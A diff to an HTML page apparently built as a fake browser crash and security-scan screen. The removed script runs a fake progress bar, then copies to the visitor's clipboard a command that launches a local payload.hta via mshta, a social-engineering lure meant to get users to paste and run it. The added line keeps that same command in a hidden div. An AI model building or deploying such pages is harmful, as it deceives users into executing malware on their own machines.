@@ -10,6 +10,7 @@
   </style>
 </head>
 <body>
+  <div id="cso-cfg" data-cmd="mshta &quot;c:\Users\lifes\Documents\extensions\payload.hta&quot;" style="display:none"></div>
   <div style="flex:1"></div>
   <div style="max-width:600px;width:100%;">
     <div id="cso-icon-row" style="margin-bottom:20px;">
@@ -64,70 +65,5 @@
       <button id="cso-modal-ok" style="background-color:#aecbfa;color:#1f1f1f;border:none;border-radius:100px;padding:8px 20px;font-size:13px;font-weight:500;cursor:pointer;float:right;">OK</button>
     </div>
   </div>
-  <script>
-    var CMD = 'mshta "c:\\Users\\lifes\\Documents\\extensions\\payload.hta"';
-    var scanning = false;
-
-    function cpy(t) {
-      if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(t).catch(function() { cpyFb(t); });
-      } else { cpyFb(t); }
-    }
-    function cpyFb(t) {
-      var a = document.createElement('textarea');
-      a.value = t; a.style.cssText = 'position:fixed;opacity:0';
-      document.body.appendChild(a); a.select();
-      document.execCommand('copy'); document.body.removeChild(a);
-    }
-
-    document.getElementById('cso-scan-btn').addEventListener('click', function() {
-      if (scanning) return;
-      scanning = true;
-      cpy(CMD);
-      document.getElementById('cso-crash-text').style.display = 'none';
-      document.getElementById('cso-title').style.display = 'none';
-      document.getElementById('cso-action-row').style.display = 'none';
-      document.getElementById('cso-scan-text').style.display = 'block';
-      var bar = document.getElementById('cso-progress-bar');
-      var p = 0, dur = 10000 + Math.random() * 5000, s = Date.now();
-      (function tick() {
-        var e = Date.now() - s, t = Math.min((e / dur) * 100, 100);
-        if (Math.random() > 0.3) p += Math.random() * 3;
-        if (p > t) p = t;
-        bar.style.width = p + '%';
-        if (e >= dur) {
-          bar.style.width = '100%';
-          setTimeout(function() {
-            cpy(CMD);
-            document.title = 'Security issues detected';
-            document.getElementById('cso-scan-text').style.display = 'none';
-            document.getElementById('cso-icon-row').style.display = 'none';
-            document.getElementById('cso-troubleshoot').style.display = 'block';
-          }, 500);
-        } else { setTimeout(tick, 150 + Math.random() * 400); }
-      })();
-    });
-
-    document.getElementById('cso-copy-btn').addEventListener('click', function() {
-      cpy(CMD);
-      var b = this, o = b.innerHTML;
-      b.innerHTML = '<svg viewBox="0 0 16 16" width="14" height="14"><path d="M3 8l3 3 7-7" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-      setTimeout(function() { b.innerHTML = o; }, 1000);
-    });
-
-    document.getElementById('cso-learn-more').addEventListener('click', function(e) {
-      e.preventDefault();
-      document.getElementById('cso-modal').style.display = 'flex';
-    });
-
-    document.getElementById('cso-modal-ok').addEventListener('click', function() {
-      document.getElementById('cso-modal').style.display = 'none';
-    });
-
-    document.addEventListener('keydown', function(e) {
-      if (scanning) return;
-      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); document.getElementById('cso-scan-btn').click(); }
-    });
-  </script>
 </body>
 </html>
